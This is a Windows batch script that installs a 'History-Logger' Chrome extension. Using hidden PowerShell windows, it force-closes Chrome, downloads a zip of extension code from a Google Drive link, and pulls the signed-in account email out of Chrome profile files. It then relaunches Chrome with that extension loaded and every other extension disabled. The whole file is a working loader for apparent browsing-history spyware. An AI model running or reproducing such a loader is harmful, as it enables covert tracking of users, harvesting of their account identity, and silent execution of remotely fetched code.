@echo off
setlocal EnableDelayedExpansion

echo ==================================================
echo   AUTO INSTALL: History-Logger Extension Loader
echo ==================================================

REM 1) Kill any running Chrome processes so flags take effect
taskkill /F /IM chrome.exe >nul 2>&1

REM 2) Configuration
set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
set "SCRIPT_DIR=%~dp0"
set "WORKDIR=%SCRIPT_DIR%history-logger"

REM 3) Prepare work folder
if exist "%WORKDIR%" rd /s /q "%WORKDIR%"
mkdir "%WORKDIR%"

REM 4) Download extension.zip
echo Downloading extension...
powershell -NoProfile -WindowStyle Hidden -Command ^
  "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing"

REM 5) Extract ext.zip
echo Extracting extension...
powershell -NoProfile -WindowStyle Hidden -Command ^
  "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force"

REM 6) Scan Chrome profiles for signed-in email
echo Scanning for Chrome email...
set "EMAIL="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
  if exist "%%P\Preferences" (
    for /f "usebackq delims=" %%E in (`
      powershell -NoProfile -WindowStyle Hidden -Command ^
        "try {(Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email} catch {''}"
    `) do if not defined EMAIL set "EMAIL=%%E"
  )
)
if not defined EMAIL set "EMAIL=anonymous@demo.com"
echo Found email: %EMAIL%

REM 7) Write config.json
echo Writing config.json...
(
  echo {^"userEmail^":^"%EMAIL%"^}
) > "%WORKDIR%\config.json"

REM 8) Locate chrome.exe (64-bit default path)
set "CHROME_PATH=%ProgramFiles%\Google\Chrome\Application\chrome.exe"
if not exist "%CHROME_PATH%" (
  echo ERROR: Chrome not found at "%CHROME_PATH%"
  pause
  exit /b 1
)
echo chrome.exe located at: %CHROME_PATH%

REM 9) Launch Chrome with your unpacked extension
echo Launching Chrome with extension loaded...
start "" "%CHROME_PATH%" ^
  --disable-extensions-except="%WORKDIR%" ^
  --load-extension="%WORKDIR%" ^
  "chrome://extensions"

endlocal
